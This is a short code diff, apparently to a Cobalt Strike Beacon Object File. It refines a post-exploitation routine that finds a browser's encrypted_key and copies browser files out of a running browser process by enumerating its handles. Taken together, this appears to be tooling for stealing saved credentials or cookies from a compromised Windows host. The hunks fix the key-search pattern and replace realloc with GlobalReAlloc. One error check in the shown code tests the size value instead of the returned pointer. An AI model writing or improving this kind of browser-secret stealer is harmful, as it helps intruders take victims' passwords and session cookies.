@@ -24,6 +24,7 @@ WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError (VOID);
 WINBASEAPI HANDLE  WINAPI KERNEL32$CreateFileA (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
 WINBASEAPI DWORD   WINAPI KERNEL32$GetFileSize (HANDLE hFile, LPDWORD lpFileSizeHigh);
 WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalAlloc (UINT uFlags, SIZE_T dwBytes);
+WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalReAlloc (HGLOBAL hMem, SIZE_T dwBytes, UINT uFlags);
 WINBASEAPI BOOL WINAPI    KERNEL32$ReadFile (HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
 WINBASEAPI BOOL WINAPI    KERNEL32$CloseHandle (HANDLE hObject);
 WINBASEAPI char* __cdecl  MSVCRT$strstr (char* _String, const char* _SubString);
@@ -114,7 +115,7 @@ CHAR *GetFileContent(CHAR *path) {
 
 CHAR *ExtractKey(CHAR *buffer) {
     //look for pattern with key
-    CHAR pattern[] = "encrypted_key\":\"";
+    CHAR pattern[] = "\"encrypted_key\":\"";
     CHAR *start = MSVCRT$strstr(buffer, pattern);
     CHAR *end = NULL;
     CHAR *key = NULL;
@@ -412,7 +413,7 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName) {
     if(status == STATUS_INFO_LENGTH_MISMATCH)
     {
         dwSize = dwNeeded;
-        shi = (SYSTEM_HANDLE_INFORMATION_EX*)realloc(shi, dwSize);
+        shi = (SYSTEM_HANDLE_INFORMATION_EX*)KERNEL32$GlobalReAlloc(shi, dwSize, GMEM_MOVEABLE);
         if (dwSize == NULL)
         {
             BeaconPrintf(CALLBACK_ERROR, "Failed to reallocate memory for handle information.\n");
